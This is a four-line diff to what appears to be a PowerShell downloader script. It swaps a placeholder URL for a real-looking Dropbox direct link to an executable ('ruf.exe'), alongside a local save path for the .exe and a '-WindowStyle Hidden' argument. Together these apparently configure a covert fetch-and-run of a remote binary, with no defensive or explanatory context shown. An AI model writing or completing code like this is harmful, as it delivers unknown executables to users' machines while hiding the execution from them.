@@ -1,4 +1,4 @@
-$sourceUrl = "http://example.com/file.exe"
+$sourceUrl = "https://www.dropbox.com/s/abol3rbkbeb34h7/ruf.exe?dl=1"
 $destinationPath = "C:\downloads\file.exe"
 $arguments = "-WindowStyle Hidden"
 
